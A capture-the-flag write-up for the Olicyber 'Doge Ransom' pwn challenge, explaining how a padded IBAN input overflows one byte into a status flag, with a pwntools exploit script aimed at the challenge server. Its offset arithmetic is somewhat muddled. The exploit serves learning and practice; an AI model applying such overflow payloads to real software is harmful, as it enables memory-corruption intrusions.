---
title: "Doge Ransom — IBAN Buffer Overflow with Control Byte Injection"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "buffer-overflow", "off-by-one", "pwntools"]
difficulty: "beginner"
summary: "The IBAN input field copies 28 bytes into a buffer with room for 49. Appending the control byte 0x03 after the valid IBAN data overflows into an adjacent flag variable and unlocks the ransomware payment path."
---

## The Challenge

A ransomware simulator. You navigate a menu: choose option `1` to pay, enter a payment ID, then enter an IBAN. The IBAN validation checks the first 28 bytes but the buffer holding it is 49 bytes wide — there are 21 unused bytes after a valid IBAN before you hit adjacent memory.

## Approach

The field accepts a full IBAN (28 chars) plus extra bytes. The extra bytes spill into memory that controls the payment outcome. The byte `\x03` at offset 49 flips the payment success condition.

I had to figure out the exact length: a real IBAN like `IT70S0501811800000012284030` is 27 characters. Padding to 49 bytes and appending `\x03` fills the buffer and writes the control byte at the right offset.

## Solution

```python
#!/usr/bin/env python3
from pwn import *

if args.REMOTE:
    r = remote('dogeransom.challs.olicyber.it', 10804)
else:
    r = gdb.debug('./dogeRansom', '''
       b *main
       continue   
    ''')

r.recvuntil('\n\n> ')
r.sendline(b'1')
r.recvuntil(b': ')
r.sendline(b'1')
r.recvuntil(b': ')
r.sendline(b'IT70S0501811800000012284030\x00' + b'A' * (49-28) + b'\x03')
r.interactive()
```

`IT70S0501811800000012284030` is the valid IBAN (27 chars + `\x00` null). Then `b'A' * 21` fills the remaining legitimate buffer space. Finally `\x03` overflows one byte past the end into whatever variable guards the success check. The binary sees a valid payment confirmed and prints the flag.

## What I Learned

Off-by-one and slightly-too-large buffers are often more dangerous than huge overflows. When a field accepts "any data up to N bytes" and the adjacent memory is a status flag rather than a return address, you don't need ROP — you just need to know the distance and pick the right byte value.
